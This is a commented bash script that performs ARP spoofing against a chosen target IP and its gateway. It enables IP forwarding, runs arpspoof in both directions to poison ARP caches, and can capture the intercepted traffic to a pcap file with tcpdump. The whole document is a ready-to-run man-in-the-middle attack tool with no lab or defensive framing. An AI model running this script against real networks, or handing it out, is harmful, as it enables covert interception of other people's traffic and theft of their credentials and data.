#!/bin/bash


# This script performs ARP spoofing to intercept traffic.

# Dynamically get the active network interface
# Use the `ip route` command to identify the default network interface associated with the default route.
# This ensures the script automatically selects the primary active interface if the user doesn't specify one.
interface=$(ip route | grep default | awk '{print $5}')

# Validate that a network interface was detected
# If no interface is found, the script exits with an appropriate error message.
if [ -z "$interface" ]; then
    echo "No active network interface found. Please check your network settings or specify one using --interface."
    exit 1
fi

# Parse command-line arguments
# Supported arguments:
#   --interface <interface-name>: Specify a custom network interface (default is dynamically detected).
#   --target <IP>: Specify the target IP address for ARP spoofing.
#   --gateway <IP>: Specify the gateway IP address for ARP spoofing.
#   --capture: Enable traffic capture and save it to a file.
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --interface)
            # Assign the user-specified interface to the variable
            interface="$2"
            shift # Skip the next argument since it has been processed
            ;;
        --target)
            # Capture the target IP address for ARP spoofing
            target="$2"
            shift # Skip the next argument since it has been processed
            ;;
        --gateway)
            # Capture the gateway IP address for ARP spoofing
            gateway="$2"
            shift # Skip the next argument since it has been processed
            ;;
        --capture)
            # Enable traffic capture mode
            capture=true
            ;;
        *)
            # Handle unknown arguments and provide an error message
            echo "Unknown parameter: $1"
            echo "Usage: ./script.sh [--interface <interface-name>] --target <IP> --gateway <IP> [--capture]"
            exit 1
            ;;
    esac
    shift # Move to the next argument
done

# Validate that required parameters are provided
# Ensure both the target and gateway IP addresses are specified.
if [ -z "$target" ] || [ -z "$gateway" ]; then
    echo "Error: Please specify both --target and --gateway."
    echo "Usage: ./script.sh [--interface <interface-name>] --target <IP> --gateway <IP> [--capture]"
    exit 1
fi

# Enable IP forwarding
# IP forwarding is required to allow packets to be forwarded between the target and the gateway.
# This command writes "1" to the /proc/sys/net/ipv4/ip_forward file to enable IP forwarding.
echo "Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# Start ARP spoofing
# The `arpspoof` tool sends spoofed ARP packets to the target and the gateway to intercept traffic.
# Two instances of `arpspoof` are run in the background to poison the ARP cache in both directions.
echo "Starting ARP spoofing..."
sudo arpspoof -i "$interface" -t "$target" "$gateway" &
arpspoof_target_pid=$! # Capture the process ID of the first `arpspoof` command
sudo arpspoof -i "$interface" -t "$gateway" "$target" &
arpspoof_gateway_pid=$! # Capture the process ID of the second `arpspoof` command

# Capture traffic if requested
# If the `--capture` flag is set, use `tcpdump` to capture traffic on the specified interface.
# The captured packets are saved to a file named `capture.pcap`.
if [ "$capture" = true ]; then
    echo "Capturing traffic on interface: $interface"
    sudo tcpdump -i "$interface" -w capture.pcap
fi

# Cleanup function to stop ARP spoofing and disable IP forwarding
# This function is called when the script exits (e.g., via Ctrl+C or normal termination).
cleanup() {
    echo "Stopping ARP spoofing..."
    sudo kill "$arpspoof_target_pid" "$arpspoof_gateway_pid" 2>/dev/null
    echo "Disabling IP forwarding..."
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
    echo "Cleanup complete. Exiting."
}

# Trap the EXIT signal to ensure the cleanup function runs when the script exits
trap cleanup EXIT
